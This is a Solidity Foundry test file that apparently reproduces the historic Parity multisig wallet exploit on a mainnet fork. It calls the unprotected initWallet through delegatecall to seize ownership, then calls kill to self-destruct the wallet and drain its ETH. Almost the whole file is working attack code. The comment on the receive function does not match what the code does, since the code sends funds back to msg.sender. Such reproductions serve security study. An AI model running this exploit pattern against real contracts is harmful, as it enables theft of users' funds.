// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IParity {
    function isOwner(address _addr) external view returns (bool);

    function kill(address _to) external;

    function initWallet(
        address[] memory _owners,
        uint256 _required,
        uint256 _daylimit
    ) external;
}

contract ContractTest is Test {
    IParity ParityContract =
        IParity(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4);

    address[] public owner;

    function setUp() public {
        vm.createSelectFork("mainnet", 4501735); //fork mainnet at block 4501735
    }

    function testFailNotOwner() public {
        bool isntOwner = ParityContract.isOwner(address(this)); // not a owner of contract
        assertTrue(isntOwner);
    }

    // initWallet parity contract ==> fallback ==> delegate call to WalletLibrary initWallet
    // ==> sets attacker as owner as context is Parity contract
    function testAddOwner() external {
        owner.push(address(this));
        ParityContract.initWallet(owner, 0, 0);

        bool isOwner = ParityContract.isOwner(address(this));
        assertTrue(isOwner);
    }

    // set attacker as owner of Parity wallet and self destruct to get all moolah
    function testAttack() external {
        owner.push(address(this));
        ParityContract.initWallet(owner, 0, 0);

        ParityContract.kill(address(this));
    }

    // as all of Parity's ETH is streaming into this contract, redirect it to the attacker address
    receive() external payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}
